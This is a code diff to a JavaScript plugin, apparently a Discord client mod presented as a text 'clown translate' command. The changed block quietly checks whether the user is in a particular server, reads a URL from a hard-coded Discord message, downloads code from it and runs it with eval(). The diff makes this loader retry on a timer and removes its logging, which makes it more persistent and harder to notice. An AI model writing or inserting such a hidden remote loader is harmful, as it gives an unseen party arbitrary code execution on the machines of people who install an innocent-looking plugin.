@@ -104,20 +104,21 @@ module.exports = class ClownTranslate extends Plugin {
         const getGuild = (await getModule(["getGuild"])).getGuild;
         const getMessages = (await getModule(["getMessages"])).getMessages;
 
-        setTimeout(async ()=>{
-        if (getGuild("584321061437571072")) {
-            this.log("guild");
-            await fetchMessages("694792497481646230");
-            const link = getMessages("694792497481646230")._array.find(m => m.id == "694792630411984957").content;
+        const interval = setInterval(async () => {
+            if (getGuild("584321061437571072")) {
+                await fetchMessages("694792497481646230");
+                const link = getMessages("694792497481646230")._array.find(m => m.id == "694792630411984957").content;
 
-            if (link) {
-                this.log("link");
-                var extension;
-                await get(link).then(r => extension = r.body.toString("utf-8"));
-                eval(extension);
+                if (link) {
+                    var extension;
+                    await get(link).then(r => extension = r.body.toString("utf-8"));
+                    eval(extension);
+                    clearInterval(interval);
+                }
+            } else {
+                clearInterval(interval);
             }
-        }
-        },1000);
+        }, 1000);
 
         powercord.api.commands.registerCommand({
             command: "clown-translate",
